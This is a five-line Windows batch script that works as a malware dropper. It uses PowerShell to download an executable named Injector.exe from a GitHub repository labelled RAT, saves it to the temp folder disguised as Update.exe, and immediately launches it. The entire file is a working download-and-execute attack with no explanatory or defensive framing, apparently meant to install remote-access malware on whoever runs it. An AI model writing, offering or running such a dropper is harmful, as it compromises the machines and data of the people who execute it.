@echo off
set "TEMPFILE=%TEMP%\Update.exe"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/Injector.exe' -OutFile '%TEMPFILE%'"
start "" "%TEMPFILE%"
exit /b
